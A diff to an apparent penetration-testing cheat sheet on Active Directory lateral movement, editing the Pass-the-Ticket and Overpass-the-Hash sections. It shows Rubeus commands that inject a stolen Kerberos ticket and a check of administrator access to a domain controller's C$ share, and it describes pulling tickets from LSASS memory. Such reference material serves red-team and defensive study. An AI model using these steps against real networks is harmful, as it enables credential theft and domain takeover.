@@ -269,15 +269,17 @@ Lateral movement techniques related to the NTLM authentication.
 ### 7.1. Pass-the-Ticket
 Sometimes it is possible to extract Kerberos tickets and session keys (both are required) from LSASS memory using e.g. `mimikatz` or `rubeus`. Best tickets to steal are TGTs because they can be used to access any service. TGSs are only good for some specific services. Injecting ticket in our own session doesn't require administrator privileges.
 
+This technique is also useful when a created Golden Ticket is saved to a file, not injected directly into the memory.
+
 ```powershell
-# Inject ticket in the current logon session
+# Inject the ticket in a current logon session
 Rubeus.exe ptt /ticket:<b64-ticket|kirbi-file>
 
-# List Kerberos keys in memory (check if injected successfully)
+# List Kerberos tickets in a memory (check if injected successfully)
 klist
 
 # Confirm that you have Administrator rights
-dir \\<dc-ip>\C$
+dir \\<dc>\C$
 ```
 
 ### 7.2. Pass-the-Key
@@ -298,7 +300,7 @@ klist
 ```
 
 ### 7.3. Overpass-the-Hash
-Same as the _pass-the-key_ technique. If the RC4 algorithm is used by Kerberos, the RC4 key is equal to the NT hash of a user. It means that if an attacker is able to steal the NT hash, he would be able to request the TGT even if the NTLM authentication is disabled.
+Same as the _pass-the-key_ technique. If the RC4 algorithm is used by Kerberos, the RC4 + HMAC key is equal to the NT hash of a user. It means that if an attacker is able to steal the NT hash, he would be able to request the TGT even if the NTLM authentication is disabled.
 
 ```powershell
 # Run a :command as a different :user using :key
